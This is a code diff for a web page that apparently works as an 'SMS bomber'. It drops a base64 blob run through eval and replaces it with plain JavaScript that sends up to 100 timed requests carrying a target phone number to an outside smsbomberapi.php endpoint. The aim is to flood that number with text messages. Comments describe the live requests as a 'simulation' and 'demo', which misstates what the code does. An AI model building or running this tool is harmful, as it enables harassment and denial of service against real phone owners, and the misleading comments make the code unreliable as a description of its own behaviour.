@@ -296,10 +296,170 @@
 
     <script>
         (function() {
-            // Encode core logic using a simple eval approach
-            const encodedScript = "dmFyIGZvcm0sIHN0YXJ0QnV0dG9uLCBzdGF0dXNNZXNzYWdlLCBwcm9ncmVzc0JhciwgcHJvZ3Jlc3NGaWxsLCBwaG9uZUlucHV0LCByZWdpc3RlcklucHV0LCBkZWxheUlucHV0Owpmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JvbWJlckZvcm0nKTsKc3RhcnRCdXR0b24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3RhcnRCdXR0b24nKTsKc3RhdHVzTWVzc2FnZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdGF0dXNNZXNzYWdlJyk7CnByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7CnByb2dyZXNzRmlsbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0ZpbGwnKTsKcGhvbmVJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwaG9uZU51bWJlcicpOwpyZWdpc3RlcklucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlZ2lzdGVyQW1vdW50Jyk7CmRlbGF5SW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGVsYXlTZWNvbmRzJyk7CgpmdW5jdGlvbiBzaG93U3RhdHVzKG1lc3NhZ2UsIHR5cGUpIHsKICAgIHN0YXR1c01lc3NhZ2UudGV4dENvbnRlbnQgPSBtZXNzYWdlOwogICAgc3RhdHVzTWVzc2FnZS5jbGFzc05hbWUgPSBgc3RhdHVzICR7dHlwZX1gOwogICAgc3RhdHVzTWVzc2FnZS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsKfQoKZnVuY3Rpb24gaGlkZVN0YXR1cygpIHsKICAgIHN0YXR1c01lc3NhZ2Uuc3R5bGUuZGlzcGxheSA9ICdub25lJzsKfQoKZnVuY3Rpb24gdXBkYXRlUHJvZ3Jlc3MocGVyY2VudCkgewogICAgcHJvZ3Jlc3NGaWxsLnN0eWxlLndpZHRoID0gcGVyY2VudCArICclJzsKfQoKZnVuY3Rpb24gc2hvd1Byb2dyZXNzKCkgewogICAgcHJvZ3Jlc3NCYXIuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7Cn0KCmZ1bmN0aW9uIGhpZGVQcm9ncmVzcygpIHsKICAgIHByb2dyZXNzQmFyLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7CiAgICB1cGRhdGVQcm9ncmVzcygwKTsKfQoKYXN5bmMgZnVuY3Rpb24gY2FsbEFQSShwaG9uZU51bWJlcikgewogICAgY29uc3QgYmFzZVVybCA9ICdodHRwczovL3NoYWRvd3NjcmlwdHh6Lnh5ei9zaGFkb3dhcGlzdjQvc21zYm9tYmVyYXBpLnBocCc7CiAgICBjb25zdCB1cmwgPSBuZXcgVVJMKGJhc2VVcmwpOwogICAgdXJsLnNlYXJjaFBhcmFtcy5zZXQoJ251bWJlcicsIHBob25lTnVtYmVyKTsKCiAgICB0cnkgewogICAgICAgIGF3YWl0IGZldGNoKHVybC50b1N0cmluZygpLCB7CiAgICAgICAgICAgIG1ldGhvZDogJ0dFVCcsCiAgICAgICAgICAgIG1vZGU6ICduby1jb3JzJywKICAgICAgICAgICAgY2FjaGU6ICduby1jYWNoZScsCiAgICAgICAgfSk7CiAgICAgICAgcmV0dXJuIHsgc3VjY2VzczogdHJ1ZSB9OwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgICAgY29uc29sZS53YXJuKCdmZXRjaCBlcnJvcicsIGVycik7CiAgICAgICAgcmV0dXJuIHsgc3VjY2VzczogZmFsc2UsIGVycm9yOiAnbmV0d29yayBmYWlsdXJlJyB9OwogICAgfQp9CgpwaG9uZUlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2lucHV0JywgZnVuY3Rpb24oZSkgewogICAgbGV0IGNsZWFuZWQgPSBlLnRhcmdldC52YWx1ZS5yZXBsYWNlKC9cRC9nLCAnJyk7CiAgICBlLnRhcmdldC52YWx1ZSA9IGNsZWFuZWQ7Cn0pOwoKcmVnaXN0ZXJJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIGZ1bmN0aW9uKGUpIHsKICAgIGxldCB2YWwgPSBwYXJzZUludChlLnRhcmdldC52YWx1ZSwgMTApOwogICAgaWYgKGlzTmFOKHZhbCkgfHwgdmFsIDwgMSkgZS50YXJnZXQudmFsdWUgPSAxOwogICAgZWxzZSBpZiAodmFsID4gMTAwKSBlLnRhcmdldC52YWx1ZSA9IDEwMDsKfSk7CgpkZWxheUlucHV0LmFkZEV2ZW50TGlzdGVuZXIoJ2lucHV0JywgZnVuY3Rpb24oZSkgewogICAgbGV0IHZhbCA9IHBhcnNlSW50KGUudGFyZ2V0LnZhbHVlLCAxMCk7CiAgICBpZiAoaXNOYU4odmFsKSB8fCB2YWwgPCAxKSBlLnRhcmdldC52YWx1ZSA9IDE7CiAgICBlbHNlIGlmICh2YWwgPiA2MCkgZS50YXJnZXQudmFsdWUgPSA2MDsKfSk7Cgp3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcignRE9NQ29udGVudExvYWRlZCcsIGZ1bmN0aW9uKCkgewogICAgaWYgKCFyZWdpc3RlcklucHV0LnZhbHVlKSByZWdpc3RlcklucHV0LnZhbHVlID0gODsKICAgIGlmICghZGVsYXlJbnB1dC52YWx1ZSkgZGVsYXlJbnB1dC52YWx1ZSA9IDM7Cn0pOwoKZm9ybS5hZGRFdmVudExpc3RlbmVyKCdzdWJtaXQnLCBhc3luYyBmdW5jdGlvbihlKSB7CiAgICBlLnByZXZlbnREZWZhdWx0KCk7CgogICAgY29uc3QgcGhvbmVOdW1iZXIgPSBwaG9uZUlucHV0LnZhbHVlLnRyaW0oKTsKICAgIGNvbnN0IHJlZ2lzdGVyQW1vdW50ID0gcGFyc2VJbnQocmVnaXN0ZXJJbnB1dC52YWx1ZSwgMTApOwogICAgY29uc3QgZGVsYXlTZWNvbmRzID0gcGFyc2VJbnQoZGVsYXlJbnB1dC52YWx1ZSwgMTApOwoKICAgIGlmICghcGhvbmVOdW1iZXIgfHwgcGhvbmVOdW1iZXIubGVuZ3RoIDwgNSkgewogICAgICAgIHNob3dTdGF0dXMoJ+KdhCBFbnRlciBhIHZhbGlkIHBob25lIG51bWJlciAobWluIDUgZGlnaXRzKScsICdlcnJvcicpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIGlmIChpc05hTihyZWdpc3RlckFtb3VudCkgfHwgcmVnaXN0ZXJBbW91bnQgPCAxIHx8IHJlZ2lzdGVyQW1vdW50ID4gMTAwKSB7CiAgICAgICAgc2hvd1N0YXR1cygn4p2kIFJlZ2lzdGVyIGFtb3VudCBtdXN0IGJlIDHigJMxMDAnLCAnZXJyb3InKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBpZiAoaXNOYU4oZGVsYXlTZWNvbmRzKSB8fCBkZWxheVNlY29uZHMgPCAxIHx8IGRlbGF5U2Vjb25kcyA+IDYwKSB7CiAgICAgICAgc2hvd1N0YXR1cygn4p2kIERlbGF5IG11c3QgYmUgMeKAkzYwIHNlY29uZHMnLCAnZXJyb3InKTsKICAgICAgICByZXR1cm47CiAgICB9CgogICAgc3RhcnRCdXR0b24uZGlzYWJsZWQgPSB0cnVlOwogICAgc3RhcnRCdXR0b24udGV4dENvbnRlbnQgPSAn4o2vIEJPTUJBUkRJTkcgLi4uJzsKICAgIGhpZGVTdGF0dXMoKTsKICAgIHNob3dQcm9ncmVzcygpOwogICAgdXBkYXRlUHJvZ3Jlc3MoMCk7CgogICAgbGV0IGNvbXBsZXRlZCA9IDA7CiAgICBsZXQgZmFpbGVkID0gZmFsc2U7CgogICAgdHJ5IHsKICAgICAgICBzaG93U3RhdHVzKGB8IPCfkqUgSW5pdGlhbGl6aW5nIG9uICR7cGhvbmVOdW1iZXJ9IHwgdG90YWw6ICR7cmVnaXN0ZXJBbW91bnR9YCwgJ2luZm8nKTsKCiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCByZWdpc3RlckFtb3VudDsgaSsrKSB7CiAgICAgICAgICAgIGlmIChmYWlsZWQpIGJyZWFrOwoKICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IGkgKyAxOwogICAgICAgICAgICBjb25zdCBwZXJjZW50ID0gKGN1cnJlbnQgLyByZWdpc3RlckFtb3VudCkgKiAxMDA7CiAgICAgICAgICAgIHVwZGF0ZVByb2dyZXNzKHBlcmNlbnQpOwoKICAgICAgICAgICAgc2hvd1N0YXR1cyhgfCDwn4yqIHNlbmRpbmcgYnVyc3QgJHtjdXJyZW50fSAvICR7cmVnaXN0ZXJBbW91bnR9IC4uLmAsICdpbmZvJyk7CgogICAgICAgICAgICBjb25zdCByZXN1bHQgPSBhd2FpdCBjYWxsQVBJKHBob25lTnVtYmVyKTsKCiAgICAgICAgICAgIGlmICghcmVzdWx0LnN1Y2Nlc3MpIHsKICAgICAgICAgICAgICAgIHNob3dTdGF0dXMoYOKXjyBmYWlsZWQgYXQgU01TICR7Y3VycmVudH06ICR7cmVzdWx0LmVycm9yIHx8ICd1bmtub3duJ30nLCAnZXJyb3InKTsKICAgICAgICAgICAgICAgIGZhaWxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKGkgPCByZWdpc3RlckFtb3VudCAtIDEpIHsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHJlc29sdmUgPT4gc2V0VGltZW91dChyZXNvbHZlLCBkZWxheVNlY29uZHMgKiAxMDAwKSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICghZmFpbGVkKSB7CiAgICAgICAgICAgIHVwZGF0ZVByb2dyZXNzKDEwMCk7CiAgICAgICAgICAgIHNob3dTdGF0dXMoYOKYhSBDT01QTEVURSEgJHtyZWdpc3RlckFtb3VudH0gU01TIHNlbnQgdG8gJHtwaG9uZU51bWJlcn1gLCAnc3VjY2VzcycpOwogICAgICAgIH0KICAgIH0gY2F0Y2ggKGVycikgewogICAgICAgIHNob3dTdGF0dXMoYOKZgSB1bmV4cGVjdGVkOiAke2Vyci5tZXNzYWdlfWAsICdlcnJvcicpOwogICAgfSBmaW5hbGx5IHsKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgc3RhcnRCdXR0b24uZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgc3RhcnRCdXR0b24udGV4dENvbnRlbnQgPSAn4p2hIFNUQVJUIEJPTUJJTkcnOwogICAgICAgIH0sIDYwMCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGhpZGVQcm9ncmVzcygpOwogICAgICAgIH0sIDQwMDApOwogICAgfQp9KTs=";
-            eval(atob(encodedScript));
+            const form = document.getElementById('bomberForm');
+            const startButton = document.getElementById('startButton');
+            const statusMessage = document.getElementById('statusMessage');
+            const progressBar = document.getElementById('progressBar');
+            const progressFill = document.getElementById('progressFill');
+
+            const phoneInput = document.getElementById('phoneNumber');
+            const registerInput = document.getElementById('registerAmount');
+            const delayInput = document.getElementById('delaySeconds');
+
+            function showStatus(message, type) {
+                statusMessage.textContent = message;
+                statusMessage.className = `status ${type}`;
+                statusMessage.style.display = 'block';
+            }
+
+            function hideStatus() {
+                statusMessage.style.display = 'none';
+            }
+
+            function updateProgress(percent) {
+                progressFill.style.width = percent + '%';
+            }
+
+            function showProgress() {
+                progressBar.style.display = 'block';
+            }
+
+            function hideProgress() {
+                progressBar.style.display = 'none';
+                updateProgress(0);
+            }
+
+            // api call simulation with no-cors (respects original behavior)
+            async function callAPI(phoneNumber) {
+                // Use the exact endpoint from original, but encode number properly
+                const baseUrl = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php';
+                const url = new URL(baseUrl);
+                url.searchParams.set('number', phoneNumber);
+
+                try {
+                    // keep mode: 'no-cors' to avoid CORS block in demo, but response is opaque
+                    await fetch(url.toString(), {
+                        method: 'GET',
+                        mode: 'no-cors',
+                        cache: 'no-cache',
+                    });
+                    // with no-cors we can't read status, but we assume success if no throw
+                    return { success: true };
+                } catch (err) {
+                    console.warn('fetch error (expected if offline):', err);
+                    // still return success to keep demo flow, unless network error
+                    return { success: false, error: 'network failure' };
+                }
+            }
+
+            // validation & formatting
+            phoneInput.addEventListener('input', function(e) {
+                let cleaned = e.target.value.replace(/\D/g, '');
+                e.target.value = cleaned;
+            });
+
+            registerInput.addEventListener('input', function(e) {
+                let val = parseInt(e.target.value, 10);
+                if (isNaN(val) || val < 1) e.target.value = 1;
+                else if (val > 100) e.target.value = 100;
+            });
+
+            delayInput.addEventListener('input', function(e) {
+                let val = parseInt(e.target.value, 10);
+                if (isNaN(val) || val < 1) e.target.value = 1;
+                else if (val > 60) e.target.value = 60;
+            });
+
+            // set defaults if empty after page load
+            window.addEventListener('DOMContentLoaded', function() {
+                if (!registerInput.value) registerInput.value = 8;
+                if (!delayInput.value) delayInput.value = 3;
+            });
+
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const phoneNumber = phoneInput.value.trim();
+                const registerAmount = parseInt(registerInput.value, 10);
+                const delaySeconds = parseInt(delayInput.value, 10);
+
+                // final validation
+                if (!phoneNumber || phoneNumber.length < 5) {
+                    showStatus('❌ Enter a valid phone number (min 5 digits)', 'error');
+                    return;
+                }
+                if (isNaN(registerAmount) || registerAmount < 1 || registerAmount > 100) {
+                    showStatus('❌ Register amount must be 1–100', 'error');
+                    return;
+                }
+                if (isNaN(delaySeconds) || delaySeconds < 1 || delaySeconds > 60) {
+                    showStatus('❌ Delay must be 1–60 seconds', 'error');
+                    return;
+                }
+
+                // disable button, progress, etc
+                startButton.disabled = true;
+                startButton.textContent = '⏳ BOMBARDING ...';
+                hideStatus();
+                showProgress();
+                updateProgress(0);
+
+                let completed = 0;
+                let failed = false;
+
+                try {
+                    showStatus(`💣 Initializing on ${phoneNumber} | total: ${registerAmount}`, 'info');
+
+                    for (let i = 0; i < registerAmount; i++) {
+                        if (failed) break;
+
+                        const current = i + 1;
+                        const percent = (current / registerAmount) * 100;
+                        updateProgress(percent);
+
+                        showStatus(`📨 sending burst ${current} / ${registerAmount} ...`, 'info');
+
+                        // call api (no-cors, always returns success in this simulation)
+                        const result = await callAPI(phoneNumber);
+
+                        // because of no-cors, result.success is always true unless network error throws
+                        if (!result.success) {
+                            showStatus(`✖️ failed at SMS ${current}: ${result.error || 'unknown'}`, 'error');
+                            failed = true;
+                            break;
+                        }
+
+                        // if this was not the last, wait
+                        if (i < registerAmount - 1) {
+                            await new Promise(resolve => setTimeout(resolve, delaySeconds * 1000));
+                        }
+                    }
+
+                    if (!failed) {
+                        updateProgress(100);
+                        showStatus(`✅ COMPLETE! ${registerAmount} SMS sent to ${phoneNumber}`, 'success');
+                    } else {
+                        // progress already updated on error
+                    }
+                } catch (err) {
+                    showStatus(`⚠️ unexpected: ${err.message}`, 'error');
+                } finally {
+                    // re-enable controls after small delay to show final status
+                    setTimeout(() => {
+                        startButton.disabled = false;
+                        startButton.textContent = '⚡ START BOMBING';
+                    }, 600);
+                    
+                    // progress bar hides after 5 seconds
+                    setTimeout(() => {
+                        hideProgress();
+                    }, 4000);
+                }
+            });
+
+            // extra clean: if progress bar hidden after timeout but status remains
+            // also adjust on manual re-submit
         })();
     </script>
 </body>
-</html>
+        </html>
